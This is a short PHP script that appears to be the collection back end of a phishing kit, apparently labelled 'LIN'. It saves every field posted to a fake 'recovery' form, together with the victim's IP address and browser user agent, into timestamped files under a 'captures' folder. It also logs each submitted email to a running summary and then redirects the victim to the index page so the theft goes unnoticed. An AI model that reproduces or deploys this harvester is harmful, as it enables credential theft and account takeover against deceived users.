<?php
$code='LIN';
$dir='../../captures/'.$code;
if(!file_exists($dir))mkdir($dir,0755,true);
$ip=$_SERVER['REMOTE_ADDR']??'Unknown';
$ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
$file=$dir.'/RECOVERY_'.date('Ymd_His').'.txt';
$content="RECOVERY DATA:\n";
foreach($_POST as $k=>$v){if($k!='platform')$content.="$k: $v\n";}
$content.="IP: $ip\nUA: $ua\n";
file_put_contents($file,$content);
file_put_contents($dir.'/RECOVERY_SUMMARY.txt',"✅ RECOVERY | ".($_POST['email']??'N/A')." | ".date('Y-m-d H:i:s')."\n",FILE_APPEND);
header('Location:index.html');
exit;
?>